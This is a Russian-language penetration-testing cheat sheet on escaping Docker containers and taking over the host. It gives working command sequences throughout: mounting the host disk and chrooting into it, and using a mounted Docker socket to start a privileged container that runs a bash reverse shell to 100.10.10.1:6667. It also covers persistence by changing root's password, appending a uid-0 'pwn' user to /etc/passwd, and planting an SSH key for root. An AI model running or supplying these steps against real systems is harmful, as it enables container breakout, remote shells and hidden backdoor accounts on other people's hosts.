# Оглавление

- [Docker escape](#docker-escape)
- [Доступ к хосту](#Доступ-к-хосту)

# Docker escape

## mount /dev/sda1

Если мы ```root```, и у нас примонтирована хостовая ОС:

```
ls -la /dev/sda*
```

Если видим ```/dev/sda1``` можем смело покидать контейнер:

```
mkdir /mnt/host
```

```
mount /dev/sda1 /mnt/host
```

```
ls -la /mnt/host/root
```

```
ls -la /mnt/host/etc
```

Видим файловую систему хоста, делаем:

```
chroot /mnt/host /bin/bash
```

Далее можем создать нового пользователя с uid=0, подложить публичный SSH ключ руту или поменять пароль root [Доступ к хосту](#доступ-к-хосту)

## Docker socket

Запустив linpeas, он может найти:

```
Docker socket mounted? ......... tmpfs on /run/docker.sock type tmpfs (rw,nosuid,nodev,noexec,relatime,size=201444k,mode=755,inode64)
```

Можно проверить права на этот файл:

```
ls -la /run/docker.sock
```

Если можем читать и выполнять, то можем выйти из контейнера.

Проверяем, можем ли достучаться до Docker socket:

```
curl --unix-socket /run/docker.sock http://localhost/images/json
```

> Или вместо /run/docker.sock используем ```/var/run/docker.sock```.

Заодно получим все доступные images.

Значит можем создать новый контейнер с выполнением docker escape через mount /dev/sda1:

```
curl --unix-socket /run/docker.sock -X POST http://localhost/containers/create \
-H "Content-Type: application/json" \
-d '{"Image":"vulhub/drupal:8.5.0","Cmd":["/bin/sh","-c","chroot /mnt /bin/bash -c \"bash -i >& /dev/tcp/100.10.10.1/6667 0>&1\""],"HostConfig":{"Binds":["/:/mnt"],"Privileged":true}}'> >
```

Здесь как раз должны указать ```Image``` и полезню нагрузку в ```Cmd``` (rshell: ```/bin/bash -c \"bash -i >& /dev/tcp/100.10.10.1/6667 0>&1\"```). Если все отработает, то в ответе получим ID созданного контейнера, запоминаем его.

Далее открываем у себя порт:

```
rlwrap nc -lvnp 6667
```

И после этого запускаем наш уязвимый контейнер:

```
curl --unix-socket /run/docker.sock -X POST http://localhost/containers/030663b38ff25d8311918d97720f89a9aa088b716fb268839a0a434e022b96db/start
```

После этого мы получим shell, но он будет все равно внутри докера, но при этом в этот контейнер будет примонтирована хостовая ОС, поэтому можем записать публичный SSH ключ для root и зайти на хост через SSH.

# Доступ к хосту

## env

Когда сидим в dockere, можем посмотреть ```env```:

```
env
```

Есть вероятность, что там будут какие-нибудь креды.

## Смена пароля root

Когда в докере имеем root и примонтировали хостовую ОС, можем попробовать сменить пароль root:

```
passwd root
```

Далее используем новый пароль.

## Создание нового пользователя:

Высчитываем хэш пароля:

```
openssl passwd -1 password
```

Записываем пользователя с uid=0 и с полученным хэшем в ```/etc/passwd```:

```
echo 'pwn:$1$FG0zmfaF$rgrSx5Qia8TGQXWgW70x90:0:0:pwn:/root:/bin/sh' >> /etc/passwd
```

## Публичный ключ для root

На своем хосте создаем пару ключей:

```
ssh-keygen -t ed25519 -f ~/.ssh/root_key
```

Получаем два файла: ```root_key``` и ```root_key.pub```. Содержимое ```root_key.pub``` добавляем в ```/root/.ssh/authorized_keys``` на уязвимом хосте:

```
echo "содержимое из root_key.pub" >> /root/.ssh/authorized_keys
```

Далее подключаемся по SSH с ключом:

```
ssh root@192.168.0.100 -i ~/.ssh/root_key
```
